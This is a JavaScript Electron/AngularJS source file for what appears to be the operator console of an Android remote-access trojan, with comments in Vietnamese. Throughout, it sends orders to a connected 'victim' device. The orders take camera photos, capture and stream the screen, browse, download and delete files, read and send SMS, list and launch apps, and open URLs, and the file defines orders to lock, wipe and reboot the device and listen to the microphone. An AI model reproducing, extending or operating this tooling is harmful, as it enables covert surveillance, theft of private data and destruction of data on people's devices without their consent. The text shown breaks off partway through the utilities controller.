const { remote, ipcRenderer } = require('electron');
var app = angular.module('myappy', ['ngRoute', 'infinite-scroll']);
var fs = require("fs-extra");
const CONSTANTS = require(__dirname + '/assets/js/Constants')
var ORDER = CONSTANTS.order;
var socket = remote.getCurrentWebContents().victim;
var homedir = require('node-homedir');
var path = require("path");

var dataPath = path.join(homedir(), CONSTANTS.dataDir);
var downloadsPath = path.join(dataPath, CONSTANTS.downloadPath);
var outputPath = path.join(dataPath, CONSTANTS.outputApkPath);
const { shell } = require('electron');

//-----------------------Routing Config------------------------
app.config(function ($routeProvider) {
    $routeProvider
        .when("/", {
            templateUrl: "./views/main.html"
        })
        .when("/camera", {
            templateUrl: "./views/camera.html",
            controller: "CamCtrl"
        })
        .when("/fileManager", {
            templateUrl: "./views/fileManager.html",
            controller: "FmCtrl"
        })
        .when("/storage", {
            templateUrl: "./views/storage.html",
            controller: "StCtrl"
        })
        .when("/smsManager", {
            templateUrl: "./views/smsManager.html",
            controller: "SMSCtrl"
        })
        .when("/callsLogs", {
            templateUrl: "./views/callsLogs.html",
            controller: "CallsCtrl"
        })
        .when("/contacts", {
            templateUrl: "./views/contacts.html",
            controller: "ContCtrl"
        })
        .when("/mic", {
            templateUrl: "./views/mic.html",
            controller: "MicCtrl"
        })
        .when("/installedApps", {
            templateUrl: "./views/installedApps.html",
            controller: "AppsCtrl"
        })
        .when("/location", {
            templateUrl: "./views/location.html",
            controller: "LocCtrl"
        })
        .when("/utilities", {
            templateUrl: "./views/utilities.html",
            controller: "UtilitiesCtrl"
        });
});



//-----------------------LAB Controller (lab.htm)------------------------
// controller for Lab.html and its views mic.html,camera.html..etc
app.controller("LabCtrl", function ($scope, $rootScope, $location) {
    $labCtrl = $scope;
    var log = document.getElementById("logy");
    $labCtrl.logs = [];

    const window = remote.getCurrentWindow();
    $labCtrl.close = () => {
        ipcRenderer.send('closeLabWindow');
    };

    $labCtrl.maximize = () => {
        if (window.isMaximized()) {
            window.unmaximize(); // Restore the window size
        } else {
            window.maximize(); // Maximize the window
        }
    };


    $rootScope.Log = (msg, status) => {
        var fontColor = CONSTANTS.logColors.DEFAULT;
        if (status == CONSTANTS.logStatus.SUCCESS)
            fontColor = CONSTANTS.logColors.GREEN;
        else if (status == CONSTANTS.logStatus.FAIL)
            fontColor = CONSTANTS.logColors.RED;

        $labCtrl.logs.push({ date: new Date().toLocaleString(), msg: msg, color: fontColor });

        // Đảm bảo cuộn xuống dưới sau khi DOM được cập nhật
        setTimeout(() => {
            if (log) {
                log.scrollTop = log.scrollHeight;
            }
        }, 10);

        if (!$labCtrl.$$phase)
            $labCtrl.$apply();
    }

    //fired when notified from Main Proccess (main.js) about
    // this victim who disconnected
    ipcRenderer.on('SocketIO:VictimDisconnected', (event) => {
        $rootScope.Log('Victim Disconnected', CONSTANTS.logStatus.FAIL);
    });


    //fired when notified from the Main Process (main.js) about
    // the Server disconnection
    ipcRenderer.on('SocketIO:ServerDisconnected', (event) => {
        $rootScope.Log('[¡] Server Disconnected', CONSTANTS.logStatus.INFO);
    });




    // to move from view to another
    $labCtrl.goToPage = (page) => {
        $location.path('/' + page);
    }





});

//-----------------------Camera Controller (camera.htm)------------------------
// camera controller
app.controller("CamCtrl", function ($scope, $rootScope) {
    $camCtrl = $scope;
    $camCtrl.isSaveShown = false;
    $camCtrl.savedPhotos = []; // Array để lưu 5 ảnh gần nhất
    $camCtrl.currentCameraIndex = 1; // Index camera hiện tại
    var camera = CONSTANTS.orders.camera;

    // remove socket listner if the camera page is changed or destroied
    $camCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(camera);
    });


    $rootScope.Log('Get cameras list');
    $camCtrl.load = 'loading';
    // send order to victim to bring camera list
    socket.emit(ORDER, { order: camera, extra: 'camList' });



    // wait any response from victim
    socket.on(camera, (data) => {
        if (data.camList == true) { // the rseponse is camera list
            $rootScope.Log('Cameras list arrived', CONSTANTS.logStatus.SUCCESS);
            $camCtrl.cameras = data.list;
            $camCtrl.load = '';
            $camCtrl.selectedCam = $camCtrl.cameras[$camCtrl.currentCameraIndex];
            $camCtrl.$apply();
        } else if (data.image == true) { // the rseponse is picture

            $rootScope.Log('Picture arrived', CONSTANTS.logStatus.SUCCESS);

            // convert binary to base64
            var uint8Arr = new Uint8Array(data.buffer);
            var binary = '';
            for (var i = 0; i < uint8Arr.length; i++) {
                binary += String.fromCharCode(uint8Arr[i]);
            }
            var base64String = window.btoa(binary);

            $camCtrl.imgUrl = 'data:image/png;base64,' + base64String;
            $camCtrl.isSaveShown = true;
            $camCtrl.$apply();

            $camCtrl.savePhoto = () => {
                // Hiển thị dialog để chọn đường dẫn và tên file
                const { dialog } = require('electron').remote;

                dialog.showSaveDialog({
                    title: 'Lưu ảnh',
                    defaultPath: path.join(downloadsPath, 'camera_' + Date.now() + '.jpg'),
                    filters: [
                        { name: 'Images', extensions: ['jpg', 'jpeg', 'png'] },
                        { name: 'All Files', extensions: ['*'] }
                    ]
                }).then((result) => {
                    if (!result.canceled && result.filePath) {
                        $rootScope.Log('Saving picture..');
                        fs.outputFile(result.filePath, new Buffer(base64String, "base64"), (err) => {
                            if (!err) {
                                $rootScope.Log('Picture saved on ' + result.filePath, CONSTANTS.logStatus.SUCCESS);

                                // Thêm ảnh vào danh sách 5 ảnh gần nhất
                                var photoInfo = {
                                    path: result.filePath,
                                    timestamp: new Date(),
                                    imageUrl: $camCtrl.imgUrl,
                                    cameraType: $camCtrl.getCameraType()
                                };

                                $camCtrl.savedPhotos.unshift(photoInfo);
                                if ($camCtrl.savedPhotos.length > 5) {
                                    $camCtrl.savedPhotos.pop(); // Xóa ảnh cũ nhất nếu vượt quá 5 ảnh
                                }
                                $camCtrl.$apply();
                            } else {
                                $rootScope.Log('Saving picture failed', CONSTANTS.logStatus.FAIL);
                            }
                        });
                    } else {
                        $rootScope.Log('Save cancelled by user');
                    }
                }).catch((err) => {
                    $rootScope.Log('Error showing save dialog: ' + err.message, CONSTANTS.logStatus.FAIL);
                });
            }
        }
        else if (data.dataType === "downloadImage" || data.dataType === "screenCast") {
            $rootScope.Log((data.dataType === "downloadImage" ? '🖼 Ảnh màn hình đã nhận' : '📺 Frame stream màn hình đã nhận'), CONSTANTS.logStatus.SUCCESS);

            var base64String = data.image64;
            $camCtrl.imgUrl = 'data:image/jpeg;base64,' + base64String;
            $camCtrl.isSaveShown = true;
            $camCtrl.$apply();

            $camCtrl.savePhoto = () => {
                // Hiển thị dialog để chọn đường dẫn và tên file
                const { dialog } = require('electron').remote;

                dialog.showSaveDialog({
                    title: 'Lưu ảnh màn hình',
                    defaultPath: path.join(downloadsPath, 'screenshot_' + Date.now() + '.jpg'),
                    filters: [
                        { name: 'Images', extensions: ['jpg', 'jpeg', 'png'] },
                        { name: 'All Files', extensions: ['*'] }
                    ]
                }).then((result) => {
                    if (!result.canceled && result.filePath) {
                        $rootScope.Log('Saving screenshot..');
                        fs.outputFile(result.filePath, Buffer.from(base64String, "base64"), (err) => {
                            if (!err) {
                                $rootScope.Log('Screenshot saved on ' + result.filePath, CONSTANTS.logStatus.SUCCESS);

                                // Thêm ảnh vào danh sách 5 ảnh gần nhất
                                var photoInfo = {
                                    path: result.filePath,
                                    timestamp: new Date(),
                                    imageUrl: $camCtrl.imgUrl,
                                    cameraType: 'Screenshot'
                                };

                                $camCtrl.savedPhotos.unshift(photoInfo);
                                if ($camCtrl.savedPhotos.length > 5) {
                                    $camCtrl.savedPhotos.pop(); // Xóa ảnh cũ nhất nếu vượt quá 5 ảnh
                                }
                                $camCtrl.$apply();
                            } else {
                                $rootScope.Log('Saving screenshot failed', CONSTANTS.logStatus.FAIL);
                            }
                        });
                    } else {
                        $rootScope.Log('Save cancelled by user');
                    }
                }).catch((err) => {
                    $rootScope.Log('Error showing save dialog: ' + err.message, CONSTANTS.logStatus.FAIL);
                });
            };
        }

    });


    $camCtrl.snap = () => {
        // send snap request to victim
        $rootScope.Log('Snap a picture');
        $scope.isCaptured = true;
        socket.emit(ORDER, { order: camera, extra: $camCtrl.selectedCam.id });
    }
    $camCtrl.screenshot = () => {
        $rootScope.Log('🖼 Yêu cầu chụp ảnh màn hình');
        socket.emit(ORDER, { order: "x0000takeScreenshot" });
    };

    $camCtrl.streamscreen = () => {
        $rootScope.Log('📺 Yêu cầu stream màn hình');
        socket.emit(ORDER, { order: "x0000streamScreen" });
    };

    // Function để chuyển đổi camera
    $camCtrl.switchCamera = () => {
        if ($camCtrl.cameras && $camCtrl.cameras.length > 1) {
            $camCtrl.currentCameraIndex = ($camCtrl.currentCameraIndex + 1) % $camCtrl.cameras.length;
            $camCtrl.selectedCam = $camCtrl.cameras[$camCtrl.currentCameraIndex];
            $rootScope.Log('Switched to camera: ' + $camCtrl.selectedCam.name);
            $camCtrl.$apply();
        }
    };

    // Function để xác định loại camera (front/back)
    $camCtrl.getCameraType = () => {
        if (!$camCtrl.selectedCam) return 'Unknown';

        var name = $camCtrl.selectedCam.name.toLowerCase();
        if (name.includes('front') || name.includes('selfie') || name.includes('user')) {
            return 'Front Camera';
        } else if (name.includes('back') || name.includes('rear') || name.includes('main')) {
            return 'Back Camera';
        } else {
            // Dựa vào index để đoán (thường camera 0 là back, 1 là front)
            return $camCtrl.currentCameraIndex === 0 ? 'Back Camera' : 'Front Camera';
        }
    };

    // Function để mở ảnh đã lưu
    $camCtrl.openSavedPhoto = (photoInfo) => {
        if (photoInfo && photoInfo.path) {
            shell.openPath(photoInfo.path);
            $rootScope.Log('Opening saved photo: ' + photoInfo.path);
        }
    };

    // Function để hiển thị ảnh lên màn hình chính
    $camCtrl.displayPhoto = (photoInfo) => {
        if (photoInfo && photoInfo.imageUrl) {
            $camCtrl.imgUrl = photoInfo.imageUrl;
            $camCtrl.isSaveShown = true;
            $rootScope.Log('Displaying photo: ' + photoInfo.cameraType);
            $camCtrl.$apply();
        }
    };

    // Function để format thời gian
    $camCtrl.formatTime = (timestamp) => {
        return timestamp.toLocaleString('vi-VN');
    };

    // Function để lấy tên file từ đường dẫn
    $camCtrl.getFileName = (filePath) => {
        if (!filePath) return 'Unknown';
        return path.basename(filePath);
    };

});
//-----------------------File Controller (fileManager.htm)------------------------
// File controller
app.controller("FmCtrl", function ($scope, $rootScope) {
    $fmCtrl = $scope;
    $fmCtrl.load = 'loading';
    $fmCtrl.files = [];
    $scope.selectedFilter = 'all';

    var fileManager = CONSTANTS.orders.fileManager;
    var deleteFileFolder = CONSTANTS.orders.deleteFileFolder;


    // remove socket listner
    $fmCtrl.$on('$destroy', () => {
        // release resources
        socket.removeAllListeners(fileManager);
        socket.removeAllListeners(deleteFileFolder);
    });

    // limit the ng-repeat
    // infinite scrolling
    $fmCtrl.barLimit = 30;
    $fmCtrl.increaseLimit = () => {
        $fmCtrl.barLimit += 30;
    }

    // send request to victim to bring files
    $rootScope.Log('Get files list');
    // socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/' });
    socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/storage/emulated/0/' });

    socket.on(fileManager, (data) => {
        if (data.file == true) { // response with file's binary
            $rootScope.Log('Saving file..');
            var filePath = path.join(downloadsPath, data.name);

            // function to save the file to my local disk
            // fs.outputFile(filePath, data.buffer, (err) => {
            //     if (err)
            //         $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
            //     else
            //         $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
            // });
            fs.outputFile(filePath, data.buffer, (err) => {
                if (err) {
                    $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
                } else {
                    $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);

                    // Nếu là ảnh hoặc video, thì mở file
                    if (/\.(jpg|jpeg|png|gif|mp4|avi|mov)$/i.test(data.name)) {
                        shell.openPath(filePath);
                        $rootScope.Log('Opening ' + filePath);
                    }
                }
            });

        } else if (data.length != 0) { // response with files list
            $rootScope.Log('Files list arrived', CONSTANTS.logStatus.SUCCESS);
            $fmCtrl.load = '';
            $fmCtrl.files = data;
            $fmCtrl.$apply();
        } else {
            $rootScope.Log('That directory is inaccessible (Access denied)', CONSTANTS.logStatus.FAIL);
            $fmCtrl.load = '';
            $fmCtrl.$apply();
        }

    });


    // when foder is clicked
    $fmCtrl.getFiles = (file) => {
        if (file != null) {
            $fmCtrl.load = 'loading';
            $rootScope.Log('Get ' + file);
            socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/' + file });
        }
    };

    // when save button is clicked
    // send request to bring file's' binary
    $fmCtrl.saveFile = (file) => {
        $rootScope.Log('Downloading ' + '/' + file);
        socket.emit(ORDER, { order: fileManager, extra: 'dl', path: '/' + file });
    }
    $scope.currentPathArray = ['/'];

    $scope.getFiles = (filePath) => {
        if (filePath != null) {
            $scope.load = 'loading';
            $rootScope.Log('Get ' + filePath);
            $scope.currentPathArray = filePath.split('/').filter(Boolean);
            socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/' + $scope.currentPathArray.join('/') });
        }
    };

    $scope.navigateTo = (index) => {
        const path = $scope.currentPathArray.slice(0, index + 1).join('/');
        $scope.getFiles('/' + path);
    };

    // File type filter function
    $scope.fileTypeFilter = function (file) {
        if ($scope.selectedFilter === 'all') {
            return true;
        }

        if (file.isDir) {
            return true; // Always show directories
        }

        var fileName = file.name.toLowerCase();

        switch ($scope.selectedFilter) {
            case 'images':
                return /\.(jpg|jpeg|png|gif|bmp|tiff|tif|webp|svg|ico|raw|heic|heif)$/i.test(fileName);
            case 'videos':
                return /\.(mp4|avi|mov|wmv|flv|webm|mkv|m4v|3gp|mpg|mpeg|ts|vob|ogv|divx|xvid|rm|rmvb|asf|swf)$/i.test(fileName);
            case 'documents':
                return /\.(pdf|doc|docx|xls|xlsx|ppt|pptx|txt|rtf|odt|ods|odp|md|log|csv|json|xml|html|htm|css|js|php|py|java|c|cpp|h|sql|sh|bat|ps1|zip|rar|7z|tar|gz|bz2)$/i.test(fileName);
            default:
                return true;
        }
    };

    // Set filter function
    $scope.setFilter = function (filter) {
        $scope.selectedFilter = filter;
        $scope.barLimit = 30; // Reset pagination when filter changes
    };

    $scope.getFileIcon = function (fileName) {
        var name = fileName.toLowerCase();

        // Image files
        if (/\.(jpg|jpeg|png|gif|bmp|tiff|tif|webp|svg|ico|raw|heic|heif)$/i.test(name)) {
            return 'file image';
        }

        // Video files
        if (/\.(mp4|avi|mov|wmv|flv|webm|mkv|m4v|3gp|mpg|mpeg|ts|vob|ogv|divx|xvid|rm|rmvb|asf|swf)$/i.test(name)) {
            return 'file video';
        }

        // Document files
        if (/\.(pdf)$/i.test(name)) return 'file pdf';
        if (/\.(doc|docx)$/i.test(name)) return 'file word';
        if (/\.(xls|xlsx)$/i.test(name)) return 'file excel';
        if (/\.(ppt|pptx)$/i.test(name)) return 'file powerpoint';
        if (/\.(txt|md|log|rtf|odt|ods|odp)$/i.test(name)) return 'file alternate outline';
        if (/\.(csv|json|xml)$/i.test(name)) return 'file code';
        if (/\.(html|htm|css|js|php|py|java|c|cpp|h|sql|sh|bat|ps1)$/i.test(name)) return 'file code';
        if (/\.(zip|rar|7z|tar|gz|bz2)$/i.test(name)) return 'file archive';

        return 'file';
    };

    $scope.deleteFile = function (filePath) {
        const isFolder = filePath.endsWith("/"); // hoặc kiểm tra tên có trong danh sách folder
        const confirmMsg = isFolder
            ? "Bạn có chắc chắn muốn xoá thư mục:\n" + filePath + " ?"
            : "Bạn có chắc chắn muốn xoá file:\n" + filePath + " ?";

        if (confirm(confirmMsg)) {
            $rootScope.Log('Deleting path "' + filePath + '"');
            socket.emit(ORDER, { order: deleteFileFolder, fileFolderPath: filePath });
        }
    };

    socket.on(deleteFileFolder, (data) => {
        if (data.status == true) {
            $rootScope.Log('Deleted successfully..', CONSTANTS.logStatus.SUCCESS);
            // Refresh the file list after successful deletion
            $scope.getFiles('/' + $scope.currentPathArray.join('/'));
        }
        else {
            $rootScope.Log("Failed to delete..", CONSTANTS.logStatus.FAIL);
        }
    });

});

// Storage controller
app.controller("StCtrl", function ($scope, $rootScope) {
    $stCtrl = $scope;
    $stCtrl.load = 'loading';
    $stCtrl.files = [];
    var storage = CONSTANTS.orders.storage;
    var deleteFileFolder = CONSTANTS.orders.deleteFileFolder;



    // remove socket listner
    $stCtrl.$on('$destroy', () => {
        // release resources
        socket.removeAllListeners(storage);
        socket.removeAllListeners(deleteFileFolder);
    });

    // limit the ng-repeat
    // infinite scrolling
    $stCtrl.barLimit = 30;
    $stCtrl.increaseLimit = () => {
        $stCtrl.barLimit += 30;
    }

    // send request to victim to bring files
    $rootScope.Log('Get storage list');
    // socket.emit(ORDER, { order: storage, extra: 'ls', path: '/' });
    socket.emit(ORDER, { order: storage, extra: 'ls', path: '/storage/emulated/0/' });

    socket.on(storage, (data) => {
        if (data.file == true) { // response with file's binary
            $rootScope.Log('Saving file..');
            var filePath = path.join(downloadsPath, data.name);

            // function to save the file to my local disk
            // fs.outputFile(filePath, data.buffer, (err) => {
            //     if (err)
            //         $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
            //     else
            //         $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
            // });
            fs.outputFile(filePath, data.buffer, (err) => {
                if (err) {
                    $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
                } else {
                    $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);

                    // Nếu là ảnh hoặc video, thì mở file
                    if (/\.(jpg|jpeg|png|gif|mp4|avi|mov)$/i.test(data.name)) {
                        shell.openPath(filePath);
                        $rootScope.Log('Opening ' + filePath);
                    }
                }
            });

        } else if (data.length != 0) { // response with files list
            $rootScope.Log('Storage Files list arrived', CONSTANTS.logStatus.SUCCESS);
            $stCtrl.load = '';
            $stCtrl.files = data;
            $stCtrl.$apply();
        } else {
            $rootScope.Log('That storage directory is inaccessible (Access denied)', CONSTANTS.logStatus.FAIL);
            $stCtrl.load = '';
            $stCtrl.$apply();
        }

    });


    // when foder is clicked
    $stCtrl.getFiles = (file) => {
        $rootScope.Log('getFilesstorage', CONSTANTS.logStatus.SUCCESS);
        if (file != null) {
            $stCtrl.load = 'loading';
            $rootScope.Log('Get ' + file);
            socket.emit(ORDER, { order: storage, extra: 'ls', path: '/' + file });
        }
    };

    // when save button is clicked
    // send request to bring file's' binary
    $stCtrl.saveFile = (file) => {
        $rootScope.Log('Downloading ' + '/' + file);
        socket.emit(ORDER, { order: storage, extra: 'dl', path: '/' + file });
    }
    $scope.currentPathArray = ['/'];

    $scope.getFilesstorage = (filePath) => {
        if (filePath != null) {
            $scope.load = 'loading';
            $rootScope.Log('Get ' + filePath);
            $scope.currentPathArray = filePath.split('/').filter(Boolean);
            socket.emit(ORDER, { order: storage, extra: 'ls', path: '/' + $scope.currentPathArray.join('/') });
        }
    };

    $scope.navigateTostorage = (index) => {
        const path = $scope.currentPathArray.slice(0, index + 1).join('/');
        $scope.getFilesstorage('/' + path);
    };

    $scope.getFileIcon = function (fileName) {
        var name = fileName.toLowerCase();

        // Image files
        if (/\.(jpg|jpeg|png|gif|bmp|tiff|tif|webp|svg|ico|raw|heic|heif)$/i.test(name)) {
            return 'file image';
        }

        // Video files
        if (/\.(mp4|avi|mov|wmv|flv|webm|mkv|m4v|3gp|mpg|mpeg|ts|vob|ogv|divx|xvid|rm|rmvb|asf|swf)$/i.test(name)) {
            return 'file video';
        }

        // Document files
        if (/\.(pdf)$/i.test(name)) return 'file pdf';
        if (/\.(doc|docx)$/i.test(name)) return 'file word';
        if (/\.(xls|xlsx)$/i.test(name)) return 'file excel';
        if (/\.(ppt|pptx)$/i.test(name)) return 'file powerpoint';
        if (/\.(txt|md|log|rtf|odt|ods|odp)$/i.test(name)) return 'file alternate outline';
        if (/\.(csv|json|xml)$/i.test(name)) return 'file code';
        if (/\.(html|htm|css|js|php|py|java|c|cpp|h|sql|sh|bat|ps1)$/i.test(name)) return 'file code';
        if (/\.(zip|rar|7z|tar|gz|bz2)$/i.test(name)) return 'file archive';

        return 'file';
    };
    $scope.deleteFile = function (filePath) {
        const isFolder = filePath.endsWith("/"); // hoặc kiểm tra tên có trong danh sách folder
        const confirmMsg = isFolder
            ? "Bạn có chắc chắn muốn xoá thư mục:\n" + filePath + " ?"
            : "Bạn có chắc chắn muốn xoá file:\n" + filePath + " ?";

        if (confirm(confirmMsg)) {
            $rootScope.Log('Deleting path "' + filePath + '"');
            socket.emit(ORDER, { order: deleteFileFolder, fileFolderPath: filePath });
        }
    };



    socket.on(deleteFileFolder, (data) => {
        if (data.status == true) {
            $rootScope.Log('Deleted successfully..', CONSTANTS.logStatus.SUCCESS);
        }
        else {
            $rootScope.Log("Failed to delete..", CONSTANTS.logStatus.FAIL);
        }
    });

    // ............................................

});

//-----------------------SMS Controller (sms.htm)------------------------
// SMS controller
app.controller("SMSCtrl", function ($scope, $rootScope) {
    $SMSCtrl = $scope;
    var sms = CONSTANTS.orders.sms;
    $SMSCtrl.smsList = [];
    $('.menu .item')
        .tab();

    $SMSCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(sms);
    });


    // send request to victim to bring all sms
    $SMSCtrl.getSMSList = () => {
        $SMSCtrl.load = 'loading';
        $SMSCtrl.barLimit = 50;
        $rootScope.Log('Get SMS list..');
        socket.emit(ORDER, { order: sms, extra: 'ls' });
    }

    $SMSCtrl.increaseLimit = () => {
        $SMSCtrl.barLimit += 50;
    }

    // Initialize SMS controller variables
    $SMSCtrl.phoneError = '';
    $SMSCtrl.msgError = '';
    $SMSCtrl.isSending = false;
    $SMSCtrl.smsStatus = null;

    // Phone number validation function
    $SMSCtrl.validatePhoneNumber = (phoneNo) => {
        if (!phoneNo || phoneNo.trim() === '') {
            return 'Phone number is required';
        }

        // Remove all non-digit characters except + and -
        const cleanPhone = phoneNo.replace(/[^\d+\-]/g, '');

        // Check if it's a valid phone number format
        const phoneRegex = /^(\+?1?[-.\s]?)?\(?([0-9]{3})\)?[-.\s]?([0-9]{3})[-.\s]?([0-9]{4})$/;
        if (!phoneRegex.test(cleanPhone)) {
            return 'Please enter a valid phone number (e.g., +1234567890 or 123-456-7890)';
        }

        return '';
    };

    // Message validation function
    $SMSCtrl.validateMessage = (msg) => {
        if (!msg || msg.trim() === '') {
            return 'Message is required';
        }

        if (msg.length > 160) {
            return 'Message is too long (max 160 characters)';
        }

        return '';
    };

    // Clear form function
    $SMSCtrl.clearForm = () => {
        $SMSCtrl.phoneNo = '';
        $SMSCtrl.msg = '';
        $SMSCtrl.phoneError = '';
        $SMSCtrl.msgError = '';
        $SMSCtrl.smsStatus = null;
    };

    // send request to victim to send sms
    $SMSCtrl.SendSMS = (phoneNo, msg) => {
        // Clear previous errors and status
        $SMSCtrl.phoneError = '';
        $SMSCtrl.msgError = '';
        $SMSCtrl.smsStatus = null;

        // Validate inputs
        const phoneValidation = $SMSCtrl.validatePhoneNumber(phoneNo);
        const msgValidation = $SMSCtrl.validateMessage(msg);

        if (phoneValidation) {
            $SMSCtrl.phoneError = phoneValidation;
            $SMSCtrl.smsStatus = {
                type: 'error',
                message: 'Please fix the errors above'
            };
            return;
        }

        if (msgValidation) {
            $SMSCtrl.msgError = msgValidation;
            $SMSCtrl.smsStatus = {
                type: 'error',
                message: 'Please fix the errors above'
            };
            return;
        }

        // Set sending state
        $SMSCtrl.isSending = true;
        $SMSCtrl.smsStatus = {
            type: 'warning',
            message: 'Sending SMS... Please wait'
        };

        $rootScope.Log('Sending SMS to ' + phoneNo);
        socket.emit(ORDER, { order: sms, extra: 'sendSMS', to: phoneNo, sms: msg });

        // Set timeout for response
        setTimeout(() => {
            if ($SMSCtrl.isSending) {
                $SMSCtrl.isSending = false;
                $SMSCtrl.smsStatus = {
                    type: 'error',
                    message: 'SMS sending timeout. Please try again.'
                };
                $rootScope.Log('SMS sending timeout', CONSTANTS.logStatus.FAIL);
            }
        }, 30000); // 30 seconds timeout
    }

    // save sms list to csv file
    $SMSCtrl.SaveSMS = () => {

        if ($SMSCtrl.smsList.length == 0)
            return;


        var csvRows = [];
        for (var i = 0; i < $SMSCtrl.smsList.length; i++) {
            csvRows.push($SMSCtrl.smsList[i].phoneNo + "," + $SMSCtrl.smsList[i].msg);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "SMS_" + Date.now() + ".csv");
        $rootScope.Log("Saving SMS List...");
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("SMS List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);

        });

    }
    $SMSCtrl.selectedPhoneNo = null;
    $SMSCtrl.showModal = false;

    $SMSCtrl.selectConversation = function (phoneNo) {
        $SMSCtrl.selectedPhoneNo = phoneNo;
        $SMSCtrl.showModal = true;
    };
    $SMSCtrl.closeModal = function () {
        $SMSCtrl.showModal = false;
    };

    //listening for victim response
    socket.on(sms, (data) => {
        if (data.smsList) {
            $SMSCtrl.load = '';
            $rootScope.Log('SMS list arrived', CONSTANTS.logStatus.SUCCESS);
            $SMSCtrl.smsList = data.smsList;
            $SMSCtrl.smsSize = data.smsList.length;
            $SMSCtrl.$apply();
        } else {
            // Handle SMS sending response
            $SMSCtrl.isSending = false;

            if (data === true) {
                $rootScope.Log('SMS sent successfully', CONSTANTS.logStatus.SUCCESS);
                $SMSCtrl.smsStatus = {
                    type: 'success',
                    message: 'SMS sent successfully!'
                };
                // Clear form after successful send
                $SMSCtrl.clearForm();
            } else {
                $rootScope.Log('SMS sending failed', CONSTANTS.logStatus.FAIL);
                $SMSCtrl.smsStatus = {
                    type: 'error',
                    message: 'Failed to send SMS. Please check the phone number and try again.'
                };
            }
            $SMSCtrl.$apply();
        }
    });



});

//-----------------------Apps Controller (installedApps.htm)------------------------
// Apps controller
app.controller("AppsCtrl", function ($scope, $rootScope) {
    $AppsCtrl = $scope;
    $AppsCtrl.appsList = [];
    $AppsCtrl.filterAppName = '';
    $AppsCtrl.sortType = 'appName'; // mặc định
    var apps = CONSTANTS.orders.apps;
    var runApp = CONSTANTS.orders.runApp;

    $AppsCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(apps);
        socket.removeAllListeners(runApp);
    });

    $AppsCtrl.load = 'loading';
    $rootScope.Log('Get Apps list..');
    socket.emit(ORDER, { order: apps });


    $AppsCtrl.barLimit = 50;
    $AppsCtrl.increaseLimit = () => {
        $AppsCtrl.barLimit += 50;
    }


    $AppsCtrl.SaveAppInfo = () => {
        if ($AppsCtrl.appsList.length == 0)
            return;

        var csvRows = [];
        for (var i = 0; i < $AppsCtrl.appsList.length; i++) {
            var package_name = $AppsCtrl.appsList[i].packageName;
            var app_name = (($AppsCtrl.appsList[i].appName) == "" ? "No App Name" : $AppsCtrl.appsList[i].appName);
            var version_name = $AppsCtrl.appsList[i].versionName;
            csvRows.push("App: " + app_name + ",\t" + "Package: " + package_name + ",\t" + "Version: " + version_name);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "AppsInfo_" + Date.now() + ".csv");
        $rootScope.Log("Saving Apps Info List...");
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("Apps Info List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);

        });

    }

    $AppsCtrl.RunApp = (app_name, app_package_name) => {
        $rootScope.Log('Launching ' + app_name);
        socket.emit(ORDER, { order: runApp, extra: app_package_name });
    }

    socket.on(apps, (data) => {
        if (data.appsList) {
            $AppsCtrl.load = '';
            $rootScope.Log('Apps list arrived', CONSTANTS.logStatus.SUCCESS);
            $AppsCtrl.appsList = data.appsList;
            $AppsCtrl.totalAppsSize = data.appsList.length;
            $AppsCtrl.$apply();
        }
    });

    socket.on(runApp, (data) => {

        if (data.launchingStatus == true) {
            $rootScope.Log('App launched successfully..', CONSTANTS.logStatus.SUCCESS);
        }
        else {
            $rootScope.Log("Failed to launch app..", CONSTANTS.logStatus.FAIL);
        }
    });

    $AppsCtrl.selectedApp = null;

    $AppsCtrl.selectApp = (app) => {
        $AppsCtrl.selectedApp = app;
    };


});
//-----------------------Utilities Controller (utilities.html)------------------------
app.controller("UtilitiesCtrl", function ($scope, $rootScope) {

    $UtilitiesCtrl = $scope;
    $UtilitiesCtrl.utils = [];

    var openUrl = CONSTANTS.orders.openUrl;
    var deleteFileFolder = CONSTANTS.orders.deleteFileFolder;
    var lockDevice = CONSTANTS.orders.lockDevice;
    var wipeDevice = CONSTANTS.orders.wipeDevice;
    var rebootDevice = CONSTANTS.orders.rebootDevice;
    var listenMicrophone = CONSTANTS.orders.listenMicrophone;

    $UtilitiesCtrl.$on('$destroy', () => {
        socket.removeAllListeners(openUrl);
        socket.removeAllListeners(deleteFileFolder);
        socket.removeAllListeners(lockDevice);
        socket.removeAllListeners(wipeDevice);
        socket.removeAllListeners(rebootDevice);
        socket.removeAllListeners(listenMicrophone);
    });


    $UtilitiesCtrl.OpenURL = (url) => {

        if (CUSTOM_FUNCTIONS.isValidURL(url)) {

            $rootScope.Log('Opening url..');
            socket.emit(ORDER, { order: openUrl, url: url });
        }
        else {
            $rootScope.Log('Invalid URL..', CONSTANTS.logStatus.FAIL);
        }
    }

    socket.on(openUrl, (data) => {
        if (data.status == true) {
            $rootScope.Log('URL opened successfully..', CONSTANTS.logStatus.SUCCESS);
        }
        else {
            $rootScope.Log("Failed to open url..", CONSTANTS.logStatus.FAIL);
        }
    });

    // ............................................

